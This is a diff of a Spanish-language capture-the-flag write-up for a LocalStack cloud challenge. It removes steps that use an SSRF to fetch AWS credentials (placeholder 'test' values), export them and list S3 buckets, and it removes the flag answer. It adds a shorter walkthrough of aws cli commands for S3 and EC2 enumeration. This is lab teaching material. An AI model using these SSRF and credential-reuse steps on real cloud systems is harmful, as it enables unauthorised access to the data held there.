@@ -18,58 +18,26 @@
 
 
 #### **Paso 3**
-
-### **2. Explotación**
-
-Una vez confirmada la vulnerabilidad, el pentester explota el SSRF para obtener credenciales de AWS.
-
-#### **Paso 1: Obtener credenciales de AWS**
-- Ingresa la URL del servicio de metadata de AWS en el formulario:
-  ```
-  http://34.51.13.20:4566/bucket-ahau-yucatan/users.txt
-  ```
-- La aplicación devuelve las credenciales en formato JSON:
-  ```json
-  {
-      "AccessKeyId": "test",
-      "SecretAccessKey": "test",
-      "Token": "test",
-      "Region": "us-east-1"
-  }
-  ```
-
-#### **Paso 2: Configurar las credenciales**
-- Usa las credenciales obtenidas para configurar el entorno de AWS CLI:
-  ```bash
-  export AWS_ACCESS_KEY_ID=test
-  export AWS_SECRET_ACCESS_KEY=test
-  export AWS_SESSION_TOKEN=test
-  export AWS_DEFAULT_REGION=us-east-1
-  ```
-
----
-
-### **3. Post-Explotación**
-
-Con las credenciales en mano puedes interactúa con los servicios de AWS (LocalStack) para encontrar la bandera.
-
-#### **Paso 1: Listar los buckets de S3**
-- Usa el siguiente comando para listar los buckets en S3:
+- Tenemos que tener el aws cli en nuestra terminal
+- vemos que si le tiramos un
   ```bash
   aws --endpoint-url=http://34.51.13.20:4566 s3 ls
   ```
-- Observa que hay un bucket llamado `secret-bucket-challenge`.
+  
+![image](https://github.com/user-attachments/assets/0ccbea3b-3ea0-42ad-8dfd-a44d76ce885a)
 
-#### **Paso 2: Listar los archivos en el bucket**
-- Usa el siguiente comando para listar los archivos en el bucket:
-  ```bash
-  aws --endpoint-url=http://34.51.13.20:4566 s3 ls s3://secret-bucket-challenge/
-  ```
-- Observa que hay un archivo llamado `flag.txt`.
 
-### **Paso 3: Listar las instancias EC2**  
+### **Paso 4**
+- Solo revisamos el mismo archivo que encontramos hace rato con un ls
+```bash
+bucket-ahau-yucatan
+```
 
-1. Ver las instancias EC2 ejecutando el siguiente comando:  
+![image](https://github.com/user-attachments/assets/912fb263-5ec6-4a48-b5d9-93af27453da6)
+
+
+### **Paso 5**  
+- Ver las instancias EC2 ejecutando el siguiente comando:  
 
    ```bash
    aws --endpoint-url=http://34.51.13.20:4566 ec2 describe-instances \
@@ -77,13 +45,7 @@ Con las credenciales en mano puedes interactúa con los servicios de AWS (LocalS
      --output text
    ```
 
-2. La bandera es el nombre de la instancia encontrada:  
-
-   ```
-   FEMEC_Pentester_Cloud_AHAU
-   ```
-
----
+   ![image](https://github.com/user-attachments/assets/caf53d86-af3c-43b6-b8be-fe390e4eab4f)
 
 
 By M0r0k0
